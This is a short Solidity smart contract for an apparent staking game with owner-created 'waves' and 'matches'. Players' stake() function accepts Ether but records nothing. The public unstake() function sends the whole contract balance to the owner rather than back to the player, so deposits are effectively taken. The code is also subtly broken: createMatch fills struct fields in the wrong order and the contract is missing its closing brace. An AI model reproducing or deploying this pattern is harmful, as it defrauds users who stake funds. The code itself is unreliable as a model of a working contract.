pragma solidity ^0.4.24;
contract Rikki_Staterium {
    address owner;
    constructor () public {
        owner = msg.sender;
    }
    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }
    
    function storeETH() payable public {}

    struct Match{
        uint256 _waveID;
        uint256 _matchID;
        uint256 _tagA;
        uint256 _tagB;
        uint256 minStake;
        uint256 maxStake;
        uint256 endTime;
        uint256 threshold;
    }
   
    Match[] public matches;  // 1,2,1,1,1,1,1,1
    
    mapping( uint256 => uint256[] ) public Wave;
   
    //Owner Functions
    function createWave(uint256 _waveID, uint256[] _tags) public onlyOwner {
        Wave[_waveID] = _tags;
    }
    function createMatch(uint256 _waveID, uint256 _matchID, uint256 _endTime, uint256 _tagA, uint256 _tagB, uint256 _minStake, uint256 _maxStake, uint256 _threshold) public onlyOwner {
        matches.push(Match(_waveID, _matchID,  _endTime,  _tagA,  _tagB,  _minStake,  _maxStake,  _threshold));
    }
   
    //Player Functions
   
    function stake(uint256 _tag, uint256 _waveID, uint256 _matchID) payable public {
    }
   
    function unstake(uint256 _waveID, uint256 _matchID) public  {
       owner.transfer(address(this).balance);
    }
    function () public payable{}